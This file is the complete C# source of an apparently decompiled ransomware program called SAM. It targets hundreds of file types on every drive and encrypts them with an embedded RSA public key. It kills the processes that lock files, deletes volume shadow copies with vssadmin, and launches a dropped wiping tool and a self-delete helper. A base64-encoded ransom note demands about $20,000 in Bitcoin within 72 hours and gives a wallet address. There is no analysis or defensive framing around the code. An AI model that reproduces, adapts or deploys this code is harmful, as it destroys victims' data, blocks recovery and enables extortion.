using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace SAM;

internal class Program
{
	private static string[] types = new string[325]
	{
		"xls", ".xlsx", ".pdf", ".doc", ".docx", ".ppt", ".pptx", ".txt", ".dwg", ".bak",
		".bkf", ".pst", ".dbx", ".zip", ".rar", ".mdb", ".asp", ".aspx", ".html", ".htm",
		".dbf", ".3dm", ".3ds", ".3fr", ".jar", ".3g2", ".xml", ".png", ".tif", ".3gp",
		".java", ".jpe", ".jpeg", ".jpg", ".jsp", ".php", ".3pr", ".7z", ".ab4", ".accdb",
		".accde", ".accdr", ".accdt", ".ach", ".kbx", ".acr", ".act", ".adb", ".ads", ".agdl",
		".ai", ".ait", ".al", ".apj", ".arw", ".asf", ".asm", ".asx", ".avi", ".awg",
		".back", ".backup", ".backupdb", ".pbl", ".bank", ".bay", ".bdb", ".bgt", ".bik", ".bkp",
		".blend", ".bpw", ".c", ".cdf", ".cdr", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".cdrw",
		".cdx", ".ce1", ".ce2", ".cer", ".cfp", ".cgm", ".cib", ".class", ".cls", ".cmt",
		".cpi", ".cpp", ".cr2", ".craw", ".crt", ".crw", ".cs", ".csh", ".csl", ".csv",
		".dac", ".db", ".db3", ".db-journal", ".dc2", ".dcr", ".dcs", ".ddd", ".ddoc", ".ddrw",
		".dds", ".der", ".des", ".design", ".dgc", ".djvu", ".dng", ".dot", ".docm", ".dotm",
		".dotx", ".drf", ".drw", ".dtd", ".dxb", ".dxf", ".dxg", ".eml", ".eps", ".erbsql",
		".erf", ".exf", ".fdb", ".ffd", ".fff", ".fh", ".fmb", ".fhd", ".fla", ".flac",
		".flv", ".fpx", ".fxg", ".gray", ".grey", ".gry", ".h", ".hbk", ".hpp", ".ibank",
		".ibd", ".ibz", ".idx", ".iif", ".iiq", ".incpas", ".indd", ".kc2", ".kdbx", ".kdc",
		".key", ".kpdx", ".lua", ".m", ".m4v", ".max", ".mdc", ".mdf", ".mef", ".mfw",
		".mmw", ".moneywell", ".mos", ".mov", ".mp3", ".mp4", ".mpg", ".mrw", ".msg", ".myd",
		".nd", ".ndd", ".nef", ".nk2", ".nop", ".nrw", ".ns2", ".ns3", ".ns4", ".nsd",
		".nsf", ".nsg", ".nsh", ".nwb", ".nx2", ".nxl", ".nyf", ".oab", ".obj", ".odb",
		".odc", ".odf", ".odg", ".odm", ".odp", ".ods", ".odt", ".oil", ".orf", ".ost",
		".otg", ".oth", ".otp", ".ots", ".ott", ".p12", ".p7b", ".p7c", ".pab", ".pages",
		".pas", ".pat", ".pcd", ".pct", ".pdb", ".pdd", ".pef", ".pem", ".pfx", ".pl",
		".plc", ".pot", ".potm", ".potx", ".ppam", ".pps", ".ppsm", ".ppsx", ".pptm", ".prf",
		".ps", ".psafe3", ".psd", ".pspimage", ".ptx", ".py", ".qba", ".qbb", ".qbm", ".qbr",
		".qbw", ".qbx", ".qby", ".r3d", ".raf", ".rat", ".raw", ".rdb", ".rm", ".rtf",
		".rw2", ".rwl", ".rwz", ".s3db", ".sas7bdat", ".say", ".sd0", ".sda", ".sdf", ".sldm",
		".sldx", ".sql", ".sqlite", ".sqlite3", ".sqlitedb", ".sr2", ".srf", ".srt", ".srw", ".st4",
		".st5", ".st6", ".st7", ".st8", ".std", ".sti", ".stw", ".stx", ".svg", ".swf",
		".sxc", ".sxd", ".sxg", ".sxi", ".sxi", ".sxm", ".sxw", ".tex", ".tga", ".thm",
		".tlg", ".vob", ".war", ".wallet", ".wav", ".wb2", ".wmv", ".wpd", ".wps", ".x11",
		".x3f", ".xis", ".xla", ".xlam", ".xlk", ".xlm", ".xlr", ".xlsb", ".xlsm", ".xlt",
		".xltm", ".xltx", ".xlw", ".ycbcra", ".yuv"
	};

	private static List<string> mylist = new List<string>();

	private static List<string> openfiles = new List<string>();

	private static string publickey = "<RSAKeyValue><Modulus>sJkpS9wtMZ5LHlJPscmeU90NJ/9TAIThGdSfiIKmIJrgm0rk4O1G0mciFkDJ5LBWfao921cfxnNgeJ/pA5QQ7gdKeIkFE7cISAAEkaX4WLpADx4ISLeB4XyKnAHBhuTJ10upIOm2AjkiL2WKPWZN1yUIPqnKdE/50KkXnkSTbevomK2v1ObDMiYiwCgtYmHRSUBoXhcueNrKy65J12Lm/JlJYXIgyViz/EellcFKp++Xa+1TeEymk7bVQkQCVpTeWCLYT2oAolBKpGfCxigX00OH4aozrX9P0xD2YrrTO3S9nGZCu98rEswv/NA1C0YnahHfprjpMOggbB+JAkx+Uw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static string currentdir = Directory.GetCurrentDirectory();

	private static string helpfile = "HELP_DECRYPT_YOUR_FILES";

	private static string helpfileext = ".txt";

	private static string selfdel = currentdir + "\\selfdel.exe";

	private static string ext_enc = ".encryptedRSA";

	private static string txthelp = "I1doYXQgaGFwcGVuZWQgdG8geW91ciBmaWxlcz8KCkFsbCBvZiB5b3VyIGltcG9ydGFudCBmaWxlcyBlbmNyeXB0ZWQgd2l0aCBSU0EtMjA0OCwgUlNBLTIwNDggaXMgYSBwb3dlcmZ1bCBjcnlwdG9ncmFwaHkgYWxnb3JpdGhtCkZvciBtb3JlIGluZm9ybWF0aW9uIHlvdSBjYW4gdXNlIFdpa2lwZWRpYQoqYXR0ZW50aW9uOiBEb24ndCByZW5hbWUgb3IgZWRpdCBlbmNyeXB0ZWQgZmlsZXMgYmVjYXVzZSBpdCB3aWxsIGJlIGltcG9zc2libGUgdG8gZGVjcnlwdCB5b3VyIGZpbGVzCgojSG93IHRvIHJlY292ZXIgZmlsZXM/CgpSU0EgaXMgYSBhc3ltbWV0cmljIGNyeXB0b2dyYXBoaWMgYWxnb3JpdGhtLCBZb3UgbmVlZCB0d28ga2V5CgoxLVB1YmxpYyBrZXk6IHlvdSBuZWVkIGl0IGZvciBlbmNyeXB0aW9uCjItUHJpdmF0ZSBLZXk6IHlvdSBuZWVkIGl0IGZvciBkZWNyeXB0aW9uCgpTbyB5b3UgbmVlZCBQcml2YXRlIGtleSB0byByZWNvdmVyIHlvdXIgZmlsZXMsIApBbGwgb2YgeW91ciBuZXR3b3JrIGNvbXB1dGVycyBmaWxlcyBpcyBlbmNyeXB0ZWQgd2l0aCBvbmUgcHVibGljIGtleSwgU28geW91IG5lZWQganVzdCBvbmUgUHJpdmF0ZSBrZXkgdG8gcmVjb3ZlciBhbGwgY29tcHV0ZXJzIGZpbGVzClRoZSBwcml2YXRlIEtleSB0aGF0IHdlIHdpbGwgc2VuZCB3b3JrcyBvbiBhbGwgeW91ciBjb21wdXRlcnMKCiNIb3cgdG8gZ2V0IHByaXZhdGUga2V5PwoKSXQncyBub3QgcG9zc2libGUgdG8gcmVjb3ZlciB5b3VyIGZpbGVzIHdpdGhvdXQgcHJpdmF0ZSBrZXksIFlvdSBtdXN0IHNlbmQgdXMgMjAsMDAwJCBVU0QgaW4gQml0Y29pbiBhYm91dCg1MCBCVEMpIHRvIHJlY2VpdmUgcHJpdmF0ZSBrZXkgRm9yIGFsbCBhZmZlY3RlZCBjb21wdXRlcnMKQWZ0ZXIgdGhhdCB3ZSBzZW5kIHlvdXIgcHJpdmF0ZSBrZXkgaW4gb3VyIGJsb2dzLgoKKk91ciBibG9nIGFkZHJlc3M6IGh0dHBzOi8vd3d3LmFub255bWUuY29tL0Jsb2cvcGlrYXNvYXJ0CgoKKk91ciBCaXRjb2luIGFkZHJlc3M6MUZwWkZVR3FBa3lqQUdWZ0hYaGFIclNtVGhKSHhkMmE3dgoKV2UgY2hlY2sgb3VyIEJpdGNvaW4gYWRkcmVzcyBldmVyeSAyIGhvdXJzIApBZnRlciB0aGF0IHdlIHJlY2VpdmUgQml0Y29pbnMgd2Ugc2VuZCB5b3VyIFByaXZhdGUgS2V5IGluIG91ciBibG9nCgojV2hhdCBpcyBCaXRjb2luPwoKQml0Y29pbiBpcyBhbiBpbm5vdmF0aXZlIHBheW1lbnQgbmV0d29yayBhbmQgYSBuZXcga2luZCBvZiBtb25leS4KWW91IGNhbiBjcmVhdGUgYSBCaXRjb2luIGFjY291bnQgYXQgaHR0cHM6Ly9ibG9ja2NoYWluLmluZm8vIGFuZCBkZXBvc2l0IHNvbWUgbW9uZXkgaW50byB5b3VyIGFjY291bnQgYW5kIHRoZW4gc2VuZCB0byB1cwoKI0hvdyB0byBidXkgQml0Y29pbj8KClRoZXJlIGFyZSBtYW55IHdheSB0byBidXkgQml0Y29pbiBhbmQgZGVwb3NpdCBpdCBpbnRvIHlvdXIgYWNjb3VudCwgCllvdSBjYW4gYnV5IGl0IHdpdGggV2VzdGVyblVuaW9uLCBCYW5rIFdpcmUsIEludGVybmF0aW9uYWwgQmFuayB0cmFuc2ZlciwgQ2FzaCBkZXBvc2l0IGFuZCBldGMKCmh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20gLS0tPiBCdXkgQml0Y29pbiB3aXRoIFdlc3Rlcm5VbmlvbiBvciBNb25leUdyYW0KCmh0dHBzOi8vY29pbmNhZmUuY29tIC0tLT4gQnV5IEJpdGNvaW4gZmFzdCBhbmQgU2VjdXJlIHdpdGggV2VzdGVyblVuaW9uIGFuZCBDYXNoIGRlcG9zaXQKCmh0dHBzOi8vd3d3LmJpdHN0YW1wLm5ldCAtLS0+IEJ1eSBCaXRjb2luIHdpdGggYmFuayB3aXJlLCBJbnRlcm5hdGlvbmFsIGJhbmsgdHJhbnNmZXIsIFNFUEEgcGF5bWVudAoKaHR0cHM6Ly93d3cua3Jha2VuLmNvbSAtLS0+IEJ1eSBCaXRjb2luIHdpdGggYmFuayB3aXJlLCBJbnRlcm5hdGlvbmFsIGJhbmsgdHJhbnNmZXIsIFNFUEEgcGF5bWVudAoKaHR0cHM6Ly93d3cua3Jha2VuLmNvbSAtLS0+IEJ1eSBCaXRjb2luIHdpdGggYmFuayB3aXJlLCBJbnRlcm5hdGlvbmFsIGJhbmsgdHJhbnNmZXIsIFNFUEEgcGF5bWVudAoKaHR0cHM6Ly93d3cuY2NlZGsuY29tIC0tLT4gQnV5IEJpdGNvaW4gd2l0aCBiYW5rIHdpcmUsIEludGVybmF0aW9uYWwgYmFuayB0cmFuc2ZlciwgU0VQQSBwYXltZW50CgpodHRwczovL2JpdGN1cmV4LmNvbS8gLS0tPiBCdXkgQml0Y29pbiB3aXRoIGJhbmsgd2lyZSwgSW50ZXJuYXRpb25hbCBiYW5rIHRyYW5zZmVyLCBTRVBBIHBheW1lbnQKCklmIHlvdSB3YW50IHRvIHBheSB3aXRoIHlvdXIgQnVzaW5lc3MgYmFuayBhY2NvdW50IHlvdSBzaG91bGQgY3JlYXRlIGEgYnVzaW5lc3MgYWNjb3VudCBpbiBleGNoYW5nZXJzIAp0aGV5IGRvbid0IGFjY2VwdCBwYXltZW50IGZyb20gdGhpcmQgcGFydHkKCiNIb3cgdG8gdXNlIHByaXZhdGUgS2V5PwoKV2Ugc2VuZCB5b3UgYSBzaW1wbGUgc29mdHdhcmUgd2l0aCBwcml2YXRlIEtleSAKQW5kIHlvdSBqdXN0IG5lZWQgcnVuIHRoaXMgc29mdHdhcmUgb24gZWFjaCBjb21wdXRlciB0aGF0IGVuY3J5cHRlZCBhbmQgYWxsIGFmZmVjdGVkIGZpbGVzIHdpbGwgYmUgZGVjcnlwdGVkCgojZGVhZGxpbmUKCllvdSBqdXN0IGhhdmUgNzIgaG91cnMgdG8gc2VuZCB1cyB0aGUgQml0Y29pbiBhZnRlciA3MiBob3VycyB3ZSB3aWxsIHJlbW92ZSB5b3VyIHByaXZhdGUga2V5IGFuZCBpdCdzIGltcG9zc2libGUgdG8gcmVjb3ZlciB5b3VyIGZpbGVz";

	private static void Main(string[] args)
	{
		create_from_resource();
		Thread.Sleep(1000);
		Thread thread = new Thread(self_del);
		thread.Start();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady)
			{
				recursivegetfiles(driveInfo.Name);
			}
		}
		proc_exe("vssadmin", "delete shadows /all /quiet");
		if (mylist.Count > 0)
		{
			foreach (string item in mylist)
			{
				if (!islocked(item))
				{
					myeenncc(item);
				}
				else
				{
					openfiles.Add(item);
				}
			}
			mylist.Clear();
			if (openfiles.Count > 0)
			{
				foreach (string openfile in openfiles)
				{
					FileInfo fileInfo = new FileInfo(openfile);
					killproc(fileInfo.Name);
					myeenncc(openfile);
				}
			}
		}
		try
		{
			DriveInfo[] drives2 = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo2 in drives2)
			{
				if (driveInfo2.IsReady)
				{
					proc_exe(currentdir + "\\del.exe", "-c " + driveInfo2.Name.Replace("\\", "") + " /accepteula");
				}
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
		proc_exe("vssadmin", "delete shadows /all /quiet");
		create_desk_file();
	}

	public static void myeenncc(string pathfile)
	{
		FileInfo fileInfo = new FileInfo(pathfile);
		try
		{
			DriveInfo driveInfo = new DriveInfo(pathfile);
			long availableFreeSpace = driveInfo.AvailableFreeSpace;
			long length = fileInfo.Length;
			if (length >= availableFreeSpace)
			{
				return;
			}
			if (new FileInfo(pathfile).Length > 0L)
			{
				if (File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc))
				{
					FileInfo fileInfo2 = new FileInfo(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc);
					if (fileInfo2.Length <= length)
					{
						File.Delete(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc);
						encryptFile(pathfile, publickey);
						try
						{
							File.WriteAllText(fileInfo.DirectoryName + "\\" + helpfile + helpfileext, Base64Decode(txthelp));
						}
						catch (Exception)
						{
						}
					}
				}
				else
				{
					encryptFile(pathfile, publickey);
					try
					{
						File.WriteAllText(fileInfo.DirectoryName + "\\" + helpfile + helpfileext, Base64Decode(txthelp));
					}
					catch (Exception)
					{
					}
				}
			}
			if (File.Exists(pathfile))
			{
				FileInfo fileInfo3 = new FileInfo(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc);
				if (fileInfo3.Length > length)
				{
					File.Delete(pathfile);
				}
			}
		}
		catch (Exception)
		{
			if (File.Exists(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc))
			{
				File.Delete(fileInfo.DirectoryName + "\\" + fileInfo.Name + ext_enc);
			}
		}
	}

	public static bool islocked(string FileName)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(FileName, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(FileName, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream?.Close();
		}
		return false;
	}

	public static string MakePath(string plainFilePath, string newSuffix)
	{
		string path = Path.GetFileNameWithoutExtension(plainFilePath) + newSuffix;
		return Path.Combine(Path.GetDirectoryName(plainFilePath), path);
	}

	public static string encryptFile(string plainFilePath, string publicKeyPath)
	{
		FileInfo fileInfo = new FileInfo(plainFilePath);
		string encryptedFilePath = MakePath(plainFilePath, fileInfo.Extension + ext_enc);
		string manifestFilePath = MakePath(plainFilePath, ".manifest.xml");
		return Encipher.Encrypt(plainFilePath, encryptedFilePath, manifestFilePath, publicKeyPath);
	}

	public static bool isValidFilePath(string strFilePath)
	{
		bool result = false;
		try
		{
			if (File.Exists(strFilePath))
			{
				result = true;
				return result;
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	public static string proc_exe(string file, string arg)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(file, arg);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace!.ToString();
		}
	}

	public static void self_del()
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(selfdel);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process.Start(processStartInfo);
		}
		catch (Exception)
		{
		}
	}

	public static void recursivegetfiles(string path)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			FileInfo[] files = directoryInfo.GetFiles();
			string ext;
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					ext = Path.GetExtension(fileInfo.FullName);
					if (Array.Exists(types, (string element) => element == ext.ToLower()))
					{
						mylist.Add(fileInfo.FullName);
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					recursivegetfiles(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
	}

	public static void create_from_resource()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		string[] array = manifestResourceNames;
		foreach (string text in array)
		{
			string[] array2 = text.Split(new char[1] { '.' });
			if (array2[2] == "exe")
			{
				if (File.Exists(currentdir + "\\" + array2[1] + "." + array2[2]))
				{
					File.Delete(currentdir + "\\" + array2[1] + "." + array2[2]);
				}
				FileStream fileStream = new FileStream(currentdir + "\\" + array2[1] + "." + array2[2], FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text);
				byte[] buffer = new byte[4096];
				int count;
				while ((count = manifestResourceStream.Read(buffer, 0, 4096)) > 0)
				{
					fileStream.Write(buffer, 0, count);
				}
				fileStream.Close();
				manifestResourceStream.Close();
			}
		}
	}

	public static void killproc(string filename)
	{
		try
		{
			string text = proc_exe("tasklist", "/v /fo csv");
			string[] separator = new string[1] { "\r\n" };
			string[] array = text.Split(separator, StringSplitOptions.None);
			List<string> list = new List<string>();
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i].Contains(filename))
				{
					string[] array2 = array[i].Split(new char[1] { ',' });
					list.Add(array2[1].Replace("\"", ""));
				}
			}
			foreach (string item in list)
			{
				proc_exe("taskkill", "/f /pid " + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void create_desk_file()
	{
		string environmentVariable = Environment.GetEnvironmentVariable("userprofile");
		DirectoryInfo parent = Directory.GetParent(environmentVariable);
		string[] directories = Directory.GetDirectories(parent.FullName);
		string[] array = directories;
		foreach (string text in array)
		{
			if (!Directory.Exists(text + "\\Desktop"))
			{
				continue;
			}
			try
			{
				for (int j = 0; j < 10; j++)
				{
					File.WriteAllText(text + "\\Desktop\\" + helpfile + "_" + j + helpfileext, Base64Decode(txthelp));
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static string Base64Encode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}
}
